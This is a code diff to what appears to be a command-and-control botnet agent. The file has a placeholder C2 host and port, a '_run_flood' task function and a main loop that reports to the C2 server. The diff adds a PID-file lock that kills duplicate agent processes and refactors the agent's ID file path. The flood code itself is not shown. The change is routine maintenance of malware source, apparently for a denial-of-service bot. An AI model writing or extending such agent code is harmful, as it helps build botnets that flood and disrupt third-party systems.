@@ -32,8 +32,38 @@ C2_PORT = int("__C2_PORT__")
 C2_BASE = "http://{}:{}".format(C2_HOST, C2_PORT)
 METRICS_PORT = 9100
 
+# ── Single-instance lock (prevents duplicate agents on same device) ───────────
+_AGENT_BASE = os.path.dirname(os.path.abspath(__file__))
+PID_FILE  = os.path.join(_AGENT_BASE, "agent.pid")
+
+def _enforce_single_instance():
+    """Kill any other running agent.py process, then write our own PID."""
+    my_pid = os.getpid()
+    # Check existing PID file
+    if os.path.isfile(PID_FILE):
+        try:
+            old_pid = int(open(PID_FILE).read().strip())
+            if old_pid != my_pid:
+                try:
+                    import signal as _sig
+                    os.kill(old_pid, _sig.SIGTERM)
+                    time.sleep(1)
+                    try: os.kill(old_pid, _sig.SIGKILL)
+                    except OSError: pass
+                    print("[agent] Killed duplicate instance (PID {})".format(old_pid))
+                except OSError:
+                    pass  # process already dead
+        except (ValueError, OSError):
+            pass
+    # Write our PID
+    try:
+        with open(PID_FILE, "w") as f:
+            f.write(str(my_pid))
+    except Exception:
+        pass
+
 # ── Agent identity (persistent across restarts via local file) ─────────────────
-ID_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".agent_id")
+ID_FILE = os.path.join(_AGENT_BASE, ".agent_id")
 
 def _load_or_create_id():
     if os.path.isfile(ID_FILE):
@@ -334,6 +364,8 @@ def _run_flood(task):
 
 # ── Main loop ─────────────────────────────────────────────────────────────────
 def main():
+    # Enforce single instance — kill any duplicate and write our PID
+    _enforce_single_instance()
     print("[agent] ID: {}  C2: {}:{}".format(AGENT_ID, C2_HOST, C2_PORT))
 
     # Start Prometheus metrics server
